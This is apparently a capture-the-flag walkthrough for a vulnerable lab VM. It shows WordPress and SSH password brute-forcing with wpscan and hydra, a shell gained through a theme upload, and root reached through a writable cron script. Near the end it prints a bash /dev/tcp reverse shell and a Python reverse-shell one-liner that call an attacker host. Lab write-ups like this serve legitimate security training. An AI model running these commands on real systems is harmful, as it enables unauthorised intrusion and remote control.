# init

## initial scan
An initial nmap scan reveals a decent amount of information. 
+ first, there is an ftp service running that allows anonymous access
+ second, a webserver is running and the robots.txt disallows indexing of a _backup\_wordpress_ called directory
The ftp server uses vsftp version 2.3.5, which doesn't seem to be a versin with a critical flaw.

## wordpress
The wordpress instance can be reached via `http://10.0.2.8/backup_wordpress/`. 
Trying _admin:admin_ to access the site reveals that a user with this name exists.

Trying another route: 
The ftp server hosts a file called `users.txt.bk` trying to brute force the ssh access of these users with `hydra -L users.txt.bk -P /usr/share/wordlists/rockyou.txt 10.0.2.8 -t 6 ssh` reveals that password based auth is deactivated.

Time to try to get wp admin access:
`wpscan --url http://10.0.2.8/backup_wordpress -P 10k-most-common.txt -U admin -t 20`
Here, a password list provided by daniel miesslers [security lists](https://github.com/danielmiessler/SecLists) is used. The top 10k credential list is far more manageable than, for example rockyou.
But nonetheless, no hits were achieved for the useraccount admin.

Using the wordpress user scanning script on the page identifies john as an existing user account. A second _wpscan_ is started for user _john_ and the top10k list, which results in a password finding: __enigma__.

## dropping shell
The user account can be utilized to upload and activate a wordpress theme which spawns a shell. 

## enumeration
looking into the _home_ directory not much of use can be found. `ls -Rhavl` is used to quickly gain a glimpse of populated directories.

Taking a look at the running processes, something owned by a user named _whoopsie_ and a running mysql instance come to attention.
```
www-data@bsides2018:/home/john$ netstat -tulpen
netstat -tulpen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      115        10013       -
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      0          10073       -
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      0          9049        -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          7809        -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      0          11156       -
tcp6       0      0 :::80                   :::*                    LISTEN      0          9155        -
tcp6       0      0 :::22                   :::*                    LISTEN      0          7811        -
tcp6       0      0 ::1:631                 :::*                    LISTEN      0          11155       -
udp        0      0 127.0.0.1:53            0.0.0.0:*                           0          10072       -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          10007       -
udp        0      0 0.0.0.0:49292           0.0.0.0:*                           107        7907        -
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           107        7905        -
udp6       0      0 :::42053                :::*                                107        7908        -
udp6       0      0 :::5353                 :::*                                107        7906        -
```

Netstat shows ports commonly attributed to mysql, cups (631), dns ftp, ssh and web server/ http.

## getting root
While these first results were looking alright, nothing too outstanding was found. For sql, current credentials were no help and the _whoopsie_ process is an ubuntu error and crash handler.

`uname -a` indicated a kernel version succeptible to DirtyCow, but before using kernel exploits the crontabs were investigated. 

The system crontabs under `/etc/crontab` revealed a cleanup script which gets executed every minute.
After adding the following cmd to it `echo '/bin/bash -i > /dev/tcp/10.0.2.15/1234 0<&1 2>&1' >> cleanup`, a reverse root shell is spawned. The single ticks disable bash replacement and evaluation.
Since the installed netcat version lacks the `-e ` option, this cmd or alternatively something like `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` has to be used.
